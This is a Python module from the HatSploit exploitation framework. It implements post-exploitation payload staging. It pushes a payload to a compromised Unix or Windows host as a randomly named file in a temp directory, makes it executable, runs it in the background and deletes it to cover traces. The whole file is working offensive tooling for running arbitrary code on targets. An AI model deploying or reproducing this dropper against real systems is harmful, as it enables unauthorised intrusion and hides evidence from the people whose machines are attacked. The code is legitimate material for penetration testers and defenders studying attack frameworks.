#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatsploit.core.cli.badges import Badges
from hatsploit.core.session.push import Push
from hatsploit.core.base.types import Types

from hatsploit.utils.string import StringTools


class Post(Push, StringTools):
    badges = Badges()
    types = Types()

    post_methods = Push().push_methods

    def post(self, platform, payload, sender, args=[], method=None,
             location=None, concat=None, background=None, linemax=100):
        if method in self.post_methods or not method:
            if not method:
                for post_method in self.post_methods:
                    if platform in self.post_methods[post_method][0]:
                        method = post_method

                if not method:
                    self.badges.print_error("Failed to find supported post method!")
                    return False
            else:
                if platform not in self.post_methods[method][0]:
                    self.badges.print_error("Unsupported post method!")
                    return False

            self.badges.print_process(f"Sending payload stage ({str(len(payload))} bytes)...")
            filename = self.random_string(8)

            if platform in self.types.platforms['unix']:
                if not location:
                    location = '/tmp'
                if not concat:
                    concat = ';'
                if not background:
                    background = '&'

                path = location + '/' + filename
                command = f"sh -c 'chmod 777 {path} {concat} {path} {concat} rm {path}' {background}"
            elif platform in self.types.platforms['windows']:
                if not location:
                    location = '%TEMP%'
                if not concat:
                    concat = '&'
                if not background:
                    background = ''

                path = location + '\\' + filename
                command = f"{background} {path} {concat} del {path}"
            else:
                self.badges.print_error("Unsupported platform, failed to send payload stage!")
                return

            self.post_methods[method][1].push(payload, sender, path, args, linemax)
            sender(*args, command)
        else:
            self.badges.print_error("Invalid post method!")
